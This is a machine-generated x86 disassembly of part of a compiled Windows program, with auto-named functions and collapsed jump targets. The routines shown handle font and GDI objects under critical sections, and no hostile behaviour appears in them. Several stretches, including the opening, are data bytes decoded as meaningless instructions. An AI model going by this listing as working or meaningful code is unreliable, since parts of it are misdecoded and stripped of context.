add [ ebx + edx * 2 ] al
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ esi + ebp * 4 + 0x44 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
pop esp
scasb [ edi ]
inc esp
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
pop esp
scasb [ edi ]
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add al al
scasd [ edi ]
inc esp
add [ 0x6f6c6c41 ] cl
arpl [ edx + 0x65 ] dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esi + ebp * 4 + 0x44 ] bl
mov eax esi
pop esi
call sub_405b64
pop [ fs : 0x0 ]
mov eax esi
test bl bl
je r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
inc edx
jb r-xdata
imul esp [ ebx + 0x73 ] 0x0
add al [ eax ]
nop
in al 0xae
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] al
inc esp
add [ esp + ecx * 2 ] al
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esi + ebp * 4 + 0x44 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add al [ eax ]
add al [ eax ]
pop ecx
add [ edx + esi * 4 ] dl
inc esp
add [ esi ] cl
inc ecx
jae r-xdata
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
pop es
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
scasb [ edi ]
inc esp
add [ eax ] ch
add [ eax ] al
add [ ebx + ebp * 4 + 0x56ac0044 ] cl
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xaf
rol [ edi + ebp * 4 ] 0x44
add [ es : edi + ebp * 4 + 0x55060044 ] dh
jne r-xdata
imul esp [ edi + 0x6e ] 0x6f736552
add esp 0xc
add eax 0x0
push edx
jae r-xdata
pop ebx
retn
jne r-xdata
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
add [ edi ] al
adc eax 0x75724254
jae r-xdata
add al 0xaf
inc esp
scasb [ edi ]
inc esp
add [ esi + ebp * 4 + 0x44 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec [ ebx - 0x720f7426 ]
inc esi
or [ eax - 0x18 ] dl
mov al [ 0xffffffff84fffc0a ]
fstp [ esi + 0x7 ]
jo r-xdata
call DeleteCriticalSection
test bl bl
jle r-xdata
imul esp [ ebx + 0x73 ] 0x0
add al [ eax ]
sub_44af48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44afc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_44af34
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call EnterCriticalSection
xor edx edx
push ebp
push sub_44b0a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b0af
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_404204
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4043c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_410f30
test al al
je r-xdata
sub_44b0b8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_44b153
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_44b188
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_44b201
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44afc0
mov edi eax
mov [ ebx + 0x10 ] edi
cmp esi edi
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b0b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b208
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_44b214
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_44b282
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b289
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b0b8
sub_44b2a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_44b31e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b325
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov esi ebx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push edi
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_44b32c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_431088
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b3d3
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4305a0
mov ebx eax
mov eax ebx
call sub_44cf34
inc [ ebp - 0x4 ]
mov eax ebx
call sub_44df48
mov eax [ rw-data ]
call sub_44b2a8
mov eax [ rw-data ]
call sub_44b2a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3da
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4305a0
call sub_44d038
inc esi
dec ebx
jne r-xdata
sub_44be93
dec [ ebx ]
add [ eax ] al
add [ edi ] cl
inc ebp
add [ ebp ] cl
pop edi
add [ ebx ] al
dec eax
add [ ecx ] al
push edx
add [ ebx ] dl
inc ebp
add [ eax + eax ] dl
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_42fe18
retn
sub_44bed0
push ebp
mov ebp esp
add esp 0xfffffea0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x160 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44bfcd
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov edi ebx
mov esi rw-data
mov ecx 0x23
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfd4
lea eax [ ebp - 0x160 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x5c ]
push eax
push 0x5c
push esi
call GetObjectW
test eax eax
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebx + 0x4 ] eax
cmp [ ebp - 0x4c ] 0x2bc
jl r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x1
cmp [ ebp - 0x47 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x2
cmp [ ebp - 0x46 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x4
movzx eax [ ebp - 0x45 ]
mov [ ebx + 0xe ] al
lea eax [ ebp - 0x160 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x20
call sub_407290
mov eax [ ebp - 0x160 ]
lea edx [ ebp - 0x15c ]
call sub_409ff8
lea edx [ ebp - 0x15c ]
lea eax [ ebx + 0xf ]
mov cl 0x7c
call sub_404ad0
movzx eax [ ebp - 0x41 ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0xd ] 0x8
mov [ ebx + 0xc ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_44bfdc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_44afc0
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44c03c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_44b0b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44c08c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4312cc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44bb70
xor eax eax
push ebp
push sub_44c147
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_44bb70
xor eax eax
push ebp
push sub_44c12a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44b214
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44c1c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c131
mov eax [ ebp - 0x8 ]
call sub_44bb80
retn
mov eax ebx
call sub_44c548
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44c564
sub_44c178
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb70
xor eax eax
push ebp
push sub_44c1bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44b188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c1c4
mov eax [ ebp - 0x4 ]
call sub_44bb80
retn
sub_44c1d8
push ebx
mov ebx eax
movzx eax [ ebx + 0xe ]
cmp al [ rw-data ]
jne r-xdata
xor eax eax
pop ebx
retn
mov eax rw-data
lea edx [ ebx + 0xf ]
movzx ecx [ eax ]
inc ecx
call sub_404aec
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c204
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
push esi
xor edx edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44c406
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c40d
lea eax [ ebp - 0x74 ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call EnterCriticalSection
xor edx edx
push ebp
push sub_44c3d6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x70 ] eax
xor eax eax
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x1
je r-xdata
mov [ ebp - 0x60 ] 0x190
mov [ ebp - 0x60 ] 0x2bc
jmp r-xdata
mov [ ebp - 0x59 ] al
cmp [ rw-data ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x2
setne al
mov [ ebp - 0x5c ] al
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x4
setne al
mov [ ebp - 0x5b ] al
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x8
setne al
mov [ ebp - 0x5a ] al
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x1e ]
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x1f ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40a15c
lea eax [ ebp - 0x54 ]
mov ecx 0x1f
mov edx [ ebp - 0x8 ]
call sub_412694
mov esi rw-data
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40a15c
lea eax [ ebp - 0x54 ]
mov ecx 0x1f
mov edx [ ebp - 0x4 ]
call sub_412694
jmp r-xdata
movzx eax [ rw-data ]
mov [ ebp - 0x59 ] al
jmp r-xdata
mov [ ebp - 0x56 ] 0x0
cmp [ ebp - 0x64 ] 0x0
je r-xdata
call sub_453404
cmp al 0x80
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
lea eax [ ebp - 0x74 ]
mov edx [ ebp - 0xc ]
add edx 0x1f
call sub_4073f4
mov eax [ ebp - 0x74 ]
mov edx r-xdata
call sub_410fc4
test eax eax
jne r-xdata
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x58 ] 0x7
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x10
call sub_44c1d8
test al al
je r-xdata
mov [ ebp - 0x55 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x57 ] 0x0
mov eax ebx
call sub_44c5d0
dec al
je r-xdata
mov [ ebp - 0x59 ] 0x80
lea eax [ ebp - 0x70 ]
push eax
call CreateFontIndirectW
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x55 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x55 ] 0x0
sub_44c434
push ebx
push esi
add esp 0xffffff74
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_44bed0
mov edx esp
mov eax ebx
call sub_44c178
add esp 0x8c
pop esi
pop ebx
retn
sub_44c464
push ebx
push esi
add esp 0xffffff74
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x14 ]
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_44c160
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_44c178
sub_44c498
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_44c4df
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x10 ]
lea ebx [ eax + 0x1f ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a15c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c4e6
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_44c4ec
push ebx
push esi
add esp 0xfffffe74
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x18c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_44c160
lea eax [ esp + 0xf ]
xor ecx ecx
mov edx 0x7d
call sub_404c14
lea edx [ esp + 0x8c ]
mov eax esi
call sub_409ff8
lea edx [ esp + 0x8c ]
lea eax [ esp + 0xf ]
mov cl 0x7c
call sub_404ad0
mov edx esp
mov eax ebx
call sub_44c178
sub_44c564
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_44c464
pop esi
pop ebx
retn
sub_44c590
push ebx
push esi
add esp 0xffffff70
mov [ esp ] dl
mov esi eax
mov eax [ esi + 0x10 ]
movzx ebx [ eax + 0x1d ]
cmp bl [ esp ]
je r-xdata
add esp 0x90
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax esi
call sub_44c160
movzx eax [ esp ]
mov [ esp + 0x11 ] al
lea edx [ esp + 0x4 ]
mov eax esi
call sub_44c178
sub_44c5d8
push ebx
push esi
add esp 0xffffff74
mov ebx edx
mov esi eax
mov eax esi
call sub_44c5d0
cmp bl al
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44c160
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_44c178
sub_44c618
push ebx
push esi
add esp 0xffffff74
mov ebx edx
mov esi eax
mov eax esi
call sub_44c610
cmp bl al
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44c160
mov [ esp + 0xe ] bl
mov edx esp
mov eax esi
call sub_44c178
sub_44c658
push ebx
push esi
add esp 0xffffff74
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c650
cmp esi eax
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_44c160
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_44c178
sub_44c690
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push esi
mov edi esi
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push ebx
call GetObjectW
mov edi eax
cmp edi 0x10
jne r-xdata
cmp edi 0x18
jl r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x10
push ebx
call GetObjectW
test eax eax
je r-xdata
cmp edi 0x1c
jle r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax + rw-data ]
mov [ esi + 0xc ] al
mov eax [ ebp - 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0x1c
push ebx
call GetObjectW
test eax eax
je r-xdata
mov eax edi
call sub_404204
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_44c762
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
push edi
push ebx
call GetObjectW
test eax eax
je r-xdata
mov eax [ ebp - 0x30 ]
and eax 0xf
movzx eax [ eax + rw-data ]
mov [ esi + 0xc ] al
mov eax [ ebp - 0x2c ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_404220
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
and edx 0xf
movzx edx [ edx + rw-data ]
mov [ esi + 0xc ] dl
mov edx [ eax + 0x4 ]
mov [ esi + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
sub_44c7a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov edx rw-data
mov eax [ rw-data ]
call sub_44afc0
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44c7ec
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_44b0b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44c820
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4312cc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44bb70
xor eax eax
push ebp
push sub_44c8c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_44bb70
xor eax eax
push ebp
push sub_44c8a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44b214
movzx edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44ca4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c8aa
mov eax [ ebp - 0x8 ]
call sub_44bb80
retn
sub_44c8d8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_44c8f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb70
xor eax eax
push ebp
push sub_44c935
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44b188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c93c
mov eax [ ebp - 0x4 ]
call sub_44bb80
retn
sub_44c948
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x14 ]
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_44c8d8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_44c8f0
sub_44c978
push ebp
mov ebp esp
add esp 0xffffffe4
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call EnterCriticalSection
xor eax eax
push ebp
push sub_44ca16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
